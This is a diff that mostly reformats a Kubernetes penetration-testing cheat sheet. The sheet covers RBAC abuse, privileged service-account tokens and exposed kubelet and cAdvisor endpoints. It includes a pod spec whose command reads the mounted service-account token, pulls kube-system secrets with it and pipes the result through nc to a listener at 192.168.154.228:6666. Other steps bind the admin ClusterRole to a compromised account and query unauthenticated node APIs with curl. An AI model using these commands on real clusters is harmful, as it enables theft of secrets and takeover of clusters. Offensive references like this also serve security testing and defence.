@@ -4,16 +4,16 @@
 
 > Kubernetes is an open-source container-orchestration system for automating application deployment, scaling, and management. It was originally designed by Google, and is now maintained by the Cloud Native Computing Foundation.
 
-## Summary 
+## Summary
 
 - [Tools](#tools)
 - [RBAC Configuration](#rbac-configuration)
-    - [Listing Secrets](#listing-secrets)
-    - [Access Any Resource or Verb](#access-any-resource-or-verb)
-    - [Pod Creation](#pod-creation)
-    - [Privilege to Use Pods/Exec](#privilege-to-use-pods-exec)
-    - [Privilege to Get/Patch Rolebindings](#privilege-to-get-patch-rolebindings)
-    - [Impersonating a Privileged Account](#impersonating-a-privileged-account)
+  - [Listing Secrets](#listing-secrets)
+  - [Access Any Resource or Verb](#access-any-resource-or-verb)
+  - [Pod Creation](#pod-creation)
+  - [Privilege to Use Pods/Exec](#privilege-to-use-pods-exec)
+  - [Privilege to Get/Patch Rolebindings](#privilege-to-get-patch-rolebindings)
+  - [Impersonating a Privileged Account](#impersonating-a-privileged-account)
 - [Privileged Service Account Token](#privileged-service-account-token)
 - [Interesting endpoints to reach](#interesting-endpoints-to-reach)
 - [API addresses that you should know](#api-addresses-that-you-should-know)
@@ -21,11 +21,11 @@
 
 ## Tools
 
-* [kubeaudit](https://github.com/Shopify/kubeaudit). kubeaudit is a command line tool to audit Kubernetes clusters for various different security concerns: run the container as a non-root user, use a read only root filesystem, drop scary capabilities, don't add new ones, don't run privileged, ...
-* [kubesec.io](https://kubesec.io/). Security risk analysis for Kubernetes resources.
-* [kube-bench](https://github.com/aquasecurity/kube-bench). kube-bench is a Go application that checks whether Kubernetes is deployed securely by running the checks documented in the [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes/).
+- [kubeaudit](https://github.com/Shopify/kubeaudit). kubeaudit is a command line tool to audit Kubernetes clusters for various different security concerns: run the container as a non-root user, use a read only root filesystem, drop scary capabilities, don't add new ones, don't run privileged, ...
+- [kubesec.io](https://kubesec.io/). Security risk analysis for Kubernetes resources.
+- [kube-bench](https://github.com/aquasecurity/kube-bench). kube-bench is a Go application that checks whether Kubernetes is deployed securely by running the checks documented in the [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes/).
 
-* [katacoda](https://katacoda.com/courses/kubernetes). Learn Kubernetes using interactive broser-based scenarios.
+- [katacoda](https://katacoda.com/courses/kubernetes). Learn Kubernetes using interactive broser-based scenarios.
 
 ## Service Token
 
@@ -69,10 +69,14 @@ metadata:
   namespace: kube-system
 spec:
   containers:
-  - name: alpine
-    image: alpine
-    command: ["/bin/sh"]
-    args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
+    - name: alpine
+      image: alpine
+      command: ["/bin/sh"]
+      args:
+        [
+          "-c",
+          'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',
+        ]
   serviceAccountName: bootstrap-signer
   automountServiceAccountToken: true
   hostNetwork: true
@@ -88,7 +92,7 @@ kubectl exec -it <POD NAME> -n <PODS NAMESPACE> –- sh
 
 ### Privilege to Get/Patch Rolebindings
 
-The purpose of this JSON file is to bind the admin "CluserRole" to the compromised service account. 
+The purpose of this JSON file is to bind the admin "CluserRole" to the compromised service account.
 Create a malicious RoleBinging.json file.
 
 ```powershell
@@ -148,10 +152,9 @@ curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip:<port>/apis/ex
 curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip:<port>/apis/extensions/v1beta1/namespaces/default/daemonsets
 ```
 
+## API addresses that you should know
 
-## API addresses that you should know 
-
-*(External network visibility)*
+_(External network visibility)_
 
 ### cAdvisor
 
@@ -195,7 +198,6 @@ curl -k https://<IP address>:10250/pods
 curl -k https://<IP Address>:10255
 http://<external-IP>:10255/pods
 ```
-
 
 ## References
 
